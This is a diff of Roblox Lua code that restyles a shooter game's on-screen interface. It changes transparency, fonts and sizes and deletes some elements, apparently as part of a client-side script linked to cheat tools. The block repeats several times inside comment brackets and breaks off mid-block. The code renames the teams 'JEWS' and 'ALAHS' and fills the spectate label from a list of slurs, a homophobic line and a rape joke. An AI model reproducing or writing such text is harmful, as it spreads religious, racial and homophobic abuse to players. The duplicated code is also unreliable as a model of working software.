+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
